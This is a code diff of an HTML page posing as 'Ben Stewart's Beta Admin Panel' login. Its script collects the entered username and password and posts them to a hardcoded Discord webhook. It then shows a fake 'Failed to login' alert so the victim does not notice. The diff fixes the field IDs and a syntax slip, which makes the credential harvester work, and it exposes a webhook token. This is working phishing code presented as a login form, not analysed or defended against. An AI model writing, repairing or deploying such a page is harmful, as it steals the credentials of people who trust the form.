@@ -6,8 +6,8 @@
     <title>Ben's Admin Panel Login</title>
     <script>
         function sendToWebhook() {
-            const textbox1 = document.getElementById('TextBox1').value;
-            const textbox2 = document.getElementById('TextBox2').value;
+            const textbox1 = document.getElementById('textbox1').value;
+            const textbox2 = document.getElementById('textbox2').value;
 
             // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
             const webhookUrl = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
@@ -28,17 +28,17 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Success:', data);
-                alert('Failed.');
+                alert('Failed to login');
             })
-            .catch(error => {w
+            .catch(error => {
                 console.error('Error:', error);
-                alert('There was an error logging in.');
+                alert('There was an error.');
             });
         }
     </script>
 </head>
 <body>
-    <h2>Ben Stewart's Beta Admin Panel</h2>
+    <h2>Ben Stewart's Beta Admin Panel2</h2>
     <form onsubmit="event.preventDefault(); sendToWebhook();">
         <label for="textbox1">Username:</label><br>
         <input type="text" id="textbox1" name="textbox1" required><br><br>
